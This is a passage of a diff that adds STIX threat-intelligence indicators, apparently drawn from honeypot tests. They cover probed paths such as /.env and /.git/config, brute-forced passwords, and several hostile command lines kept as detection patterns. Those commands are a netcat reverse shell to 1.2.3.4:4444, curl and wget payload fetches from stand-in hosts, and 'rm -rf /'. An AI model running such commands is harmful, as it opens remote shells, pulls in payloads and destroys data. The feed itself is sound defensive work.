+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000066
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--a9e5d1db-a9c6-4a81-ae17-841775679873",
+      "created": "2025-12-04T10:19:43.397Z",
+      "modified": "2025-12-04T10:19:43.397Z",
+      "name": "URL: /exploit_1764843583328098274.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764843583328098274.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:43.397Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000065
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--26bd8d3f-9bbe-48b2-aa32-4718aa6ced24",
+      "created": "2025-12-04T10:19:43.377Z",
+      "modified": "2025-12-04T10:19:43.377Z",
+      "name": "URL: /.env_1764843583328098274",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env_1764843583328098274']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:43.377Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000064
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--5733a57d-7b80-4f3d-9938-0b9f3ac06c03",
+      "created": "2025-12-04T10:19:43.351Z",
+      "modified": "2025-12-04T10:19:43.351Z",
+      "name": "URL: /admin/attack_1764843583328098274",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/attack_1764843583328098274']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:43.351Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000063
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--fa3bdf74-c118-4131-8a1b-29ce61d04f92",
+      "created": "2025-12-04T10:19:41.318Z",
+      "modified": "2025-12-04T10:19:41.318Z",
+      "name": "URL: /exploit_1764843581259677617.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764843581259677617.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:41.318Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000062
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--9c3cf70c-b47f-48bd-a598-af797f612db1",
+      "created": "2025-12-04T10:19:41.301Z",
+      "modified": "2025-12-04T10:19:41.301Z",
+      "name": "URL: /.env_1764843581259677617",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env_1764843581259677617']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:41.301Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000061
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--f93ce578-3dd3-4873-8f9f-f33dd2a375fb",
+      "created": "2025-12-04T10:19:41.281Z",
+      "modified": "2025-12-04T10:19:41.281Z",
+      "name": "URL: /admin/attack_1764843581259677617",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/attack_1764843581259677617']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:41.281Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000060
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--340c8b11-7f60-47c9-a031-7c61ad44ad5f",
+      "created": "2025-12-04T10:19:39.248Z",
+      "modified": "2025-12-04T10:19:39.248Z",
+      "name": "URL: /exploit_1764843579171689142.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764843579171689142.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:39.248Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000059
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--6395fa21-3f63-42f5-b002-84b18740f96d",
+      "created": "2025-12-04T10:19:39.229Z",
+      "modified": "2025-12-04T10:19:39.229Z",
+      "name": "URL: /.env_1764843579171689142",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env_1764843579171689142']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:39.229Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000058
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e12e90f3-f5fd-40cf-91dc-2a1b8deccd79",
+      "created": "2025-12-04T10:19:39.202Z",
+      "modified": "2025-12-04T10:19:39.202Z",
+      "name": "URL: /admin/attack_1764843579171689142",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/attack_1764843579171689142']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:39.202Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000057
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--4505ba1c-2c30-481e-94de-fad45d6cb321",
+      "created": "2025-12-04T10:10:23.059Z",
+      "modified": "2025-12-04T10:17:26.775Z",
+      "name": "URL: /.env5",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env5']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:23.059Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000056
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--bea28a01-2bdb-4c80-9f12-c61f23ed31c6",
+      "created": "2025-12-04T10:10:23.034Z",
+      "modified": "2025-12-04T10:17:26.749Z",
+      "name": "URL: /admin/test5",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test5']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:23.034Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000055
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--96763d53-6eae-450b-bc6e-a4bc4b0a2221",
+      "created": "2025-12-04T10:10:22.000Z",
+      "modified": "2025-12-04T10:17:25.707Z",
+      "name": "URL: /.env4",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env4']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:22.000Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000054
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--19e73a32-b39d-484a-8d6a-eeae08ae84b5",
+      "created": "2025-12-04T10:10:21.980Z",
+      "modified": "2025-12-04T10:17:25.680Z",
+      "name": "URL: /admin/test4",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test4']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:21.980Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000053
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--c22b30b1-fcf4-4b5a-ab06-d9610d81e6cd",
+      "created": "2025-12-04T10:10:20.949Z",
+      "modified": "2025-12-04T10:17:24.640Z",
+      "name": "URL: /.env3",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env3']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:20.949Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000052
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--c5e288cf-d553-4ef6-9967-ef9f55f403c8",
+      "created": "2025-12-04T10:10:20.923Z",
+      "modified": "2025-12-04T10:17:24.614Z",
+      "name": "URL: /admin/test3",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test3']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:20.923Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000051
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--94796d4e-99fb-404c-8bb4-efab082524bc",
+      "created": "2025-12-04T10:10:19.886Z",
+      "modified": "2025-12-04T10:17:23.584Z",
+      "name": "URL: /.env2",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env2']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:19.886Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000050
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--12d235fa-704b-4656-9141-3fcf7796f4ff",
+      "created": "2025-12-04T10:10:19.868Z",
+      "modified": "2025-12-04T10:17:23.566Z",
+      "name": "URL: /admin/test2",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test2']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:19.868Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000049
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--da4b5548-90fa-4d01-be7b-064c6889566c",
+      "created": "2025-12-04T10:10:18.838Z",
+      "modified": "2025-12-04T10:17:22.535Z",
+      "name": "URL: /.env1",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env1']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:18.838Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000048
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--9c59aab1-e987-46ff-bce7-aa3c4d56b66b",
+      "created": "2025-12-04T10:10:18.814Z",
+      "modified": "2025-12-04T10:17:22.516Z",
+      "name": "URL: /admin/test1",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test1']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:10:18.814Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 5,
+      "x_sid": 1000047
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--dfc6b045-705b-4f97-ba83-09b76009d3bc",
+      "created": "2025-12-03T16:59:30.612Z",
+      "modified": "2025-12-04T10:07:58.327Z",
+      "name": "COMMAND: rm -rf /",
+      "description": "rm -rf",
+      "pattern": "[process:command_line = 'rm -rf /']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.612Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 6,
+      "x_sid": 1000029
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--329ecd3d-0ccf-4479-af82-d4a7d5c3a787",
+      "created": "2025-12-03T16:59:30.602Z",
+      "modified": "2025-12-04T10:07:58.313Z",
+      "name": "URL: http://bad.com/payload",
+      "description": "Malicious payload download URL",
+      "pattern": "[url:value = 'http://bad.com/payload']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.602Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 4,
+      "x_sid": 1000028
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ba14fd5c-4c5f-45a9-91fd-cdb1ebafd51b",
+      "created": "2025-12-03T16:59:30.587Z",
+      "modified": "2025-12-04T10:07:58.308Z",
+      "name": "URL: bad.com",
+      "description": "Generic URL probe",
+      "pattern": "[url:value = 'bad.com']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.587Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 8,
+      "x_sid": 1000027
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--95369351-a3b1-46d7-a01d-09a67aa9e279",
+      "created": "2025-12-03T16:59:30.582Z",
+      "modified": "2025-12-04T10:07:58.293Z",
+      "name": "COMMAND: curl http://bad.com/payload",
+      "description": "curl",
+      "pattern": "[process:command_line = 'curl http://bad.com/payload']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.582Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 4,
+      "x_sid": 1000026
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--a5287acb-7711-4441-a04a-727e7216a428",
+      "created": "2025-12-03T16:59:31.985Z",
+      "modified": "2025-12-04T10:07:58.253Z",
+      "name": "USERNAME: test",
+      "description": "Standard account enumeration",
+      "pattern": "[user-account:account_login = 'test']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:31.985Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 10,
+      "x_sid": 1000033
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--941737ac-996f-4bbc-b4ab-e70c6f9ca883",
+      "created": "2025-12-03T16:59:32.008Z",
+      "modified": "2025-12-04T10:07:58.126Z",
+      "name": "PASSWORD: asdrubla1230",
+      "description": "user:test",
+      "pattern": "[user-account:credential = 'asdrubla1230']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:32.008Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 2,
+      "x_sid": 1000035
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--9668ddcf-7786-4dd7-859f-e2529f878dbc",
+      "created": "2025-12-03T16:59:29.053Z",
+      "modified": "2025-12-04T10:07:57.874Z",
+      "name": "PASSWORD: daniel",
+      "description": "user:admin",
+      "pattern": "[user-account:credential = 'daniel']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.053Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 10,
+      "x_sid": 1000016
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--856d9ba1-75c9-41c0-8c8a-c2f25dd5f53c",
+      "created": "2025-12-03T16:59:29.038Z",
+      "modified": "2025-12-04T10:07:57.848Z",
+      "name": "PASSWORD: rockyou",
+      "description": "user:admin",
+      "pattern": "[user-account:credential = 'rockyou']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.038Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 10,
+      "x_sid": 1000015
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--df8479b8-e824-42de-a8ee-3ac343577173",
+      "created": "2025-12-03T16:59:28.973Z",
+      "modified": "2025-12-04T10:07:57.835Z",
+      "name": "PASSWORD: abc123",
+      "description": "user:admin",
+      "pattern": "[user-account:credential = 'abc123']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.973Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 10,
+      "x_sid": 1000010
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--3e8b4bf9-d7a6-4693-8c6e-9c6a76db714d",
+      "created": "2025-12-03T16:59:31.166Z",
+      "modified": "2025-12-04T10:07:57.821Z",
+      "name": "COMMAND: login attempt [admin/princess] failed",
+      "description": "nc",
+      "pattern": "[process:command_line = 'login attempt [admin/princess] failed']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:31.166Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 4,
+      "x_sid": 1000032
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--4ef864d9-7021-48ec-91fb-b57f87612c00",
+      "created": "2025-12-03T16:59:28.923Z",
+      "modified": "2025-12-04T10:07:57.765Z",
+      "name": "PASSWORD: 123456789",
+      "description": "user:admin",
+      "pattern": "[user-account:credential = '123456789']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.923Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 10,
+      "x_sid": 1000007
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--f60d16ad-d894-427e-9877-b5aa968b770b",
+      "created": "2025-12-03T16:59:30.647Z",
+      "modified": "2025-12-04T10:07:56.877Z",
+      "name": "COMMAND: nc 1.2.3.4 4444 -e /bin/sh",
+      "description": "nc",
+      "pattern": "[process:command_line = 'nc 1.2.3.4 4444 -e /bin/sh']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.647Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000031
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--c8fa5616-3aab-455c-b232-8537a5b940fa",
+      "created": "2025-12-03T16:59:30.627Z",
+      "modified": "2025-12-04T10:07:56.868Z",
+      "name": "COMMAND: busybox nc 1.2.3.4 4444 -e /bin/sh",
+      "description": "nc",
+      "pattern": "[process:command_line = 'busybox nc 1.2.3.4 4444 -e /bin/sh']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.627Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 4,
+      "x_sid": 1000030
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--8ed8c680-2839-4502-8490-672cabaf37b7",
+      "created": "2025-12-03T16:59:30.567Z",
+      "modified": "2025-12-04T10:07:56.813Z",
+      "name": "URL: http://malicious.com/x.sh",
+      "description": "Malicious payload download URL",
+      "pattern": "[url:value = 'http://malicious.com/x.sh']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.567Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000025
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--df26f88e-ec45-44e3-ad8f-3585afa3c3f1",
+      "created": "2025-12-03T16:59:30.551Z",
+      "modified": "2025-12-04T10:07:56.809Z",
+      "name": "URL: malicious.com",
+      "description": "Generic URL probe",
+      "pattern": "[url:value = 'malicious.com']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.551Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 4,
+      "x_sid": 1000024
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--2bd4422d-326f-4830-b87b-05071de64b94",
+      "created": "2025-12-03T16:59:30.546Z",
+      "modified": "2025-12-04T10:07:56.796Z",
+      "name": "COMMAND: wget http://malicious.com/x.sh",
+      "description": "wget",
+      "pattern": "[process:command_line = 'wget http://malicious.com/x.sh']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.546Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000023
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--347fc412-64c4-420b-89b2-4fa188384203",
+      "created": "2025-12-03T16:59:30.444Z",
+      "modified": "2025-12-04T10:07:56.712Z",
+      "name": "PASSWORD: atuamae",
+      "description": "user:admin",
+      "pattern": "[user-account:credential = 'atuamae']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.444Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 2,
+      "x_sid": 1000022
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--d5c67d1e-ecce-4a85-8bdf-a4ccf9e10286",
+      "created": "2025-12-04T10:07:35.000Z",
+      "modified": "2025-12-04T10:07:35.000Z",
+      "name": "IP: 203.0.113.99",
+      "description": "Observed ip from test",
+      "pattern": "[ipv4-addr:value = '203.0.113.99']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:07:35.000Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "test"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000046
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--5f485fd4-ee0a-4c65-9530-0f05d51f5da3",
+      "created": "2025-12-03T17:28:29.647Z",
+      "modified": "2025-12-03T17:28:29.647Z",
+      "name": "URL: /wp-admin/install.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/wp-admin/install.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:28:29.647Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000045
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ee56e85f-7489-4711-9c30-24a1e36850e4",
+      "created": "2025-12-03T17:28:23.489Z",
+      "modified": "2025-12-03T17:28:23.489Z",
+      "name": "URL: /login",
+      "description": "method=POST, ua=curl/7.81.0",
+      "pattern": "[url:value = '/login']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:28:23.489Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000044
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--d1a18067-0ef8-4d9b-b467-a1ce5b2a78f6",
+      "created": "2025-12-03T17:28:14.444Z",
+      "modified": "2025-12-03T17:28:16.685Z",
+      "name": "URL: /.git/config",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.git/config']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:28:14.444Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000043
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--81206932-47fb-4195-940e-cce7f12f1c2a",
+      "created": "2025-12-03T17:26:58.436Z",
+      "modified": "2025-12-03T17:28:03.639Z",
+      "name": "URL: /.env",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:26:58.436Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000040
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--59fec52c-1fc5-4b71-b28c-3cb7e61a42e7",
+      "created": "2025-12-03T17:27:51.849Z",
+      "modified": "2025-12-03T17:27:51.849Z",
+      "name": "URL: /admin",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:27:51.849Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000042
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--64c313fa-eb90-411a-b81b-e728c8ed6770",
+      "created": "2025-12-03T17:26:47.579Z",
+      "modified": "2025-12-03T17:26:47.579Z",
+      "name": "URL: /",
+      "description": "method=GET, ua=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0",
+      "pattern": "[url:value = '/']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:26:47.579Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000039
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--1561559e-bfb7-47aa-9c21-73ed6f94d1c7",
+      "created": "2025-12-03T17:26:47.563Z",
+      "modified": "2025-12-03T17:26:47.563Z",
+      "name": "IP: 192.168.1.69",
+      "description": "HTTP request to /",
+      "pattern": "[ipv4-addr:value = '192.168.1.69']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:26:47.563Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000038
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--4747ef85-cb32-46f0-b4fc-2e9972cff934",
+      "created": "2025-12-03T17:26:42.757Z",
+      "modified": "2025-12-03T17:26:42.757Z",
+      "name": "URL: /admin/login.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/login.php']",
